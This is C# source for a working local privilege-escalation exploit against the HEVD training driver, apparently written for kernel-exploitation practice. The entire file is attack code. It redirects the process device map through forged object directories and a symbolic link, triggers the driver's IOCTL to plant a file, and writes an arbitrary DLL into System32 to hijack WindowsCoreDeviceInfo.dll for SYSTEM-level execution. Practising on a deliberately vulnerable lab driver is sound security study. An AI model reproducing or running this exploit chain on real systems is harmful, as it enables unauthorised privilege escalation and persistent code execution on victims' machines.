using System;
using System.IO;
using System.Runtime.InteropServices;

namespace InsecureKernelResourceAccess
{
    class Program
    {
       [StructLayout(LayoutKind.Sequential)]
        struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            private IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct OBJECT_ATTRIBUTES : IDisposable
        {
            public int Length;
            public IntPtr RootDirectory;
            private IntPtr objectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;

            public OBJECT_ATTRIBUTES(string name, uint attrs)
            {
                Length = 0;
                RootDirectory = IntPtr.Zero;
                objectName = IntPtr.Zero;
                Attributes = attrs;
                SecurityDescriptor = IntPtr.Zero;
                SecurityQualityOfService = IntPtr.Zero;

                Length = Marshal.SizeOf(this);
                ObjectName = new UNICODE_STRING(name);
            }

            public UNICODE_STRING ObjectName
            {
                get
                {
                    return (UNICODE_STRING)Marshal.PtrToStructure(
                     objectName, typeof(UNICODE_STRING));
                }

                set
                {
                    bool fDeleteOld = objectName != IntPtr.Zero;
                    if (!fDeleteOld)
                        objectName = Marshal.AllocHGlobal(Marshal.SizeOf(value));
                    Marshal.StructureToPtr(value, objectName, fDeleteOld);
                }
            }

            public void Dispose()
            {
                if (objectName != IntPtr.Zero)
                {
                    Marshal.DestroyStructure(objectName, typeof(UNICODE_STRING));
                    Marshal.FreeHGlobal(objectName);
                    objectName = IntPtr.Zero;
                }
            }
        }

        [DllImport("ntdll.dll")]
        static extern void RtlGetNtVersionNumbers(
            ref int MajorVersion,
            ref int MinorVersion,
            ref int BuildNumber);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtCreateDirectoryObject(
            ref IntPtr DirectoryHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtCreateSymbolicLinkObject(
            ref IntPtr pHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref UNICODE_STRING DestinationName);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtOpenDirectoryObject(
            ref IntPtr DirectoryHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtSetInformationProcess(
            IntPtr ProcessHandle,
            uint ProcessInformationClass,
            IntPtr ProcessInformation,
            uint ProcessInformationLength);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            IntPtr InBuffer,
            int nInBufferSize,
            IntPtr OutBuffer,
            int nOutBufferSize,
            ref int pBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        // Helper functions
        static bool IsWin10x64()
        {
            string arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            int MajorVersion = 0;
            int MinorVersion = 0;
            int BuildNumber = 0;
            RtlGetNtVersionNumbers(ref MajorVersion, ref MinorVersion, ref BuildNumber);
            BuildNumber &= 0xFFFF;

            if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber >= 14393 &&
                string.Compare(arch, "amd64", StringComparison.OrdinalIgnoreCase) == 0)
            {
                Console.WriteLine("[+] Windows 10 x64 is detected");
                return true;
            }
            else
            {
                Console.WriteLine("[-] Unsupported OS is detected");
                return false;
            }
        }

        static IntPtr CreateDirectoryObject(IntPtr hRootDirectory, string objectName)
        {
            uint OBJ_CASE_INSENSITIVE = 0x40;
            uint DIRECTORY_ALL_ACCESS = 0x000F000F;
            int STATUS_SUCCESS = 0;
            OBJECT_ATTRIBUTES objectAttr = new OBJECT_ATTRIBUTES(objectName, OBJ_CASE_INSENSITIVE);
            IntPtr hDirectory = IntPtr.Zero;
            int ntstatus;

            if (hRootDirectory != IntPtr.Zero)
            {
                objectAttr.RootDirectory = hRootDirectory;
            }

            ntstatus = NtCreateDirectoryObject(ref hDirectory, DIRECTORY_ALL_ACCESS, ref objectAttr);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create directory (ntstatus = 0x{0})", ntstatus.ToString("X8"));
                return IntPtr.Zero;
            }

            return hDirectory;
        }

        static IntPtr CreateSymbolicLink(IntPtr hRootObject, string symlink, string target)
        {
            uint OBJ_CASE_INSENSITIVE = 0x40;
            uint OBJECT_TYPE_ALL_ACCESS = 0x000F0001;
            int STATUS_SUCCESS = 0;
            OBJECT_ATTRIBUTES objectAttr = new OBJECT_ATTRIBUTES(symlink, OBJ_CASE_INSENSITIVE);
            UNICODE_STRING targetName = new UNICODE_STRING(target);
            IntPtr hSymlink = IntPtr.Zero;
            int ntstatus;

            if (hRootObject != IntPtr.Zero)
            {
                objectAttr.RootDirectory = hRootObject;
            }

            ntstatus = NtCreateSymbolicLinkObject(ref hSymlink, OBJECT_TYPE_ALL_ACCESS, ref objectAttr, ref targetName);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create symbolic link (ntstatus = 0x{0})", ntstatus.ToString("X8"));
                return IntPtr.Zero;
            }

            return hSymlink;
        }

        static IntPtr OpenDirectoryObject(IntPtr hRootDirectory, string objectName)
        {
            uint OBJ_CASE_INSENSITIVE = 0x40;
            uint MAXIMUM_ALLOWED = 0x02000000;
            int STATUS_SUCCESS = 0;
            OBJECT_ATTRIBUTES objectAttr = new OBJECT_ATTRIBUTES(objectName, OBJ_CASE_INSENSITIVE);
            IntPtr hDirectory = IntPtr.Zero;
            int ntstatus;

            if (hRootDirectory != IntPtr.Zero)
            {
                objectAttr.RootDirectory = hRootDirectory;
            }

            ntstatus = NtOpenDirectoryObject(ref hDirectory, MAXIMUM_ALLOWED, ref objectAttr);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to open directory (ntstatus = 0x{0})", ntstatus.ToString("X8"));
                return IntPtr.Zero;
            }

            return hDirectory;
        }

        static bool SetInformationProcess(IntPtr hObject)
        {
            uint ProcessDeviceMap = 0x17;
            IntPtr PROCESS_DEVICEMAP_INFORMATION = Marshal.AllocHGlobal(IntPtr.Size);
            int STATUS_SUCCESS = 0;
            int ntstatus;

            if (IntPtr.Size == 4)
            {
                Marshal.Copy(BitConverter.GetBytes(hObject.ToInt32()), 0, PROCESS_DEVICEMAP_INFORMATION, IntPtr.Size);
            }
            else
            {
                Marshal.Copy(BitConverter.GetBytes(hObject.ToInt64()), 0, PROCESS_DEVICEMAP_INFORMATION, IntPtr.Size);
            }

            ntstatus = NtSetInformationProcess(
                new IntPtr(-1),
                ProcessDeviceMap,
                PROCESS_DEVICEMAP_INFORMATION,
                (uint)IntPtr.Size);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to set device map (ntstatus = 0x{0})", ntstatus.ToString("X8"));
                return false;
            }

            return true;
        }

        static bool WriteDLL(string source, string destination)
        {
            byte[] sourceData;
            try
            {
                sourceData = File.ReadAllBytes(source);
            }
            catch
            {
                Console.WriteLine("[-] Failed to read source DLL");
                return false;
            }
            try
            {
                File.WriteAllBytes(destination, sourceData);
            }
            catch
            {
                Console.WriteLine("[-] Failed to write DLL");
                return false;
            }
            return true;
        }

        // Main function
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("Usage: {0} <DLL Path>", System.AppDomain.CurrentDomain.FriendlyName);
                return;
            }

            string dllPath = Path.GetFullPath(args[0]); ;

            Console.WriteLine("--[ HEVD Exploitation : Insecure Kernel Resource Access\n");

            if (!IsWin10x64())
            {
                return;
            }

            // Step 1: Open driver's handle
            string deviceName = "\\\\.\\HacksysExtremeVulnerableDriver";
            uint GENERIC_READ = 0x80000000;
            uint GENERIC_WRITE = 0x40000000;
            uint FILE_SHARE_READ = 0x00000001;
            uint FILE_SHARE_WRITE = 0x00000002;
            uint OPEN_EXISTING = 0x3;
            uint FILE_ATTRIBUTE_NORMAL = 0x80;
            uint FILE_FLAG_OVERWRAPPED = 0x40000000;
            IntPtr invalid = new IntPtr(-1);

            Console.WriteLine("[>] Opening {0}", deviceName);
            IntPtr hDevice = CreateFile(
                deviceName, GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERWRAPPED, IntPtr.Zero);

            if (hDevice == invalid)
            {
                Console.WriteLine("[-] Failed to open {0} (code={1})", deviceName, Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] HEVD.sys is opened succesfuly (hDevice = 0x{0})", hDevice.ToString("X"));

            // Step 2: Setup directory
            IntPtr hRoot;
            IntPtr hCDrive;
            IntPtr hWindows;
            IntPtr hSystem32;

            Console.WriteLine("[>] Creating \\..\\C:\\Windows\\System32");

            hRoot = CreateDirectoryObject(IntPtr.Zero, string.Empty);
            if (hRoot == IntPtr.Zero)
            {
                CloseHandle(hDevice);
                return;
            }
            hCDrive = CreateDirectoryObject(hRoot, "C:");
            if (hCDrive == IntPtr.Zero)
            {
                CloseHandle(hDevice);
                CloseHandle(hRoot);
                return;
            }
            hWindows = CreateDirectoryObject(hCDrive, "Windows");
            if (hWindows == IntPtr.Zero)
            {
                CloseHandle(hDevice);
                CloseHandle(hRoot);
                CloseHandle(hCDrive);
                return;
            }
            hSystem32 = CreateDirectoryObject(hWindows, "System32");
            if (hSystem32 == IntPtr.Zero)
            {
                CloseHandle(hDevice);
                CloseHandle(hRoot);
                CloseHandle(hCDrive);
                CloseHandle(hWindows);
                return;
            }

            // Step 3: Create symbolic link
            IntPtr hSymlink;
            string targetDll = "C:\\Windows\\System32\\WindowsCoreDeviceInfo.dll";

            Console.WriteLine("[>] Creating symbolic link");
            Console.WriteLine("    |-> Symbolic Link: HEVD.log");
            Console.WriteLine("    |-> Target: \\GLOBAL??\\{0}", targetDll);

            hSymlink = CreateSymbolicLink(
                hSystem32, "HEVD.log", string.Format("\\GLOBAL??\\{0}", targetDll));

            if (hSymlink == IntPtr.Zero)
            {
                CloseHandle(hDevice);
                CloseHandle(hRoot);
                CloseHandle(hCDrive);
                CloseHandle(hWindows);
                CloseHandle(hSystem32);
                return;
            }

            // Step4: Set device map
            Console.WriteLine("[>] Setting device map");

            bool status = SetInformationProcess(hRoot);

            if (!status)
            {
                CloseHandle(hDevice);
                CloseHandle(hRoot);
                return;
            }

            // Step 5: Trigger vulnerability
            uint ioctl = 0x22203B;
            int BytesReturned = 0;

            Console.WriteLine("[>] Triggering vulnerability");
            status = DeviceIoControl(hDevice, ioctl, IntPtr.Zero, 0, IntPtr.Zero, 0, ref BytesReturned, IntPtr.Zero);

            if (!status)
            {
                Console.WriteLine("[-] Failed to send payload (code={0})", Marshal.GetLastWin32Error());
                CloseHandle(hDevice);
                CloseHandle(hRoot);
                return;
            }
            CloseHandle(hDevice);

            // Step 6: Set device map to \\GLOBAL??
            Console.WriteLine("[>] Opening \\GLOBAL??");
            IntPtr hGlobal = OpenDirectoryObject(IntPtr.Zero, "\\GLOBAL??");
            if (hGlobal == IntPtr.Zero)
            {
                return;
            }

            status = SetInformationProcess(hGlobal);

            if (!status)
            {
                return;
            }

            // Step 7: Write DLL
            Console.WriteLine("[>] Writing DLL to {0}", targetDll);
            status = WriteDLL(dllPath, targetDll);

            CloseHandle(hCDrive);
            CloseHandle(hWindows);
            CloseHandle(hSystem32);
            CloseHandle(hSymlink);
            CloseHandle(hRoot);
            CloseHandle(hGlobal);

            if (!status)
            {
                return;
            }

            Console.WriteLine("[+] Exploit is completed");
            Console.WriteLine("[*] To trigger dll hijacking, wait a few minutes or reboot system");
        }
    }
}
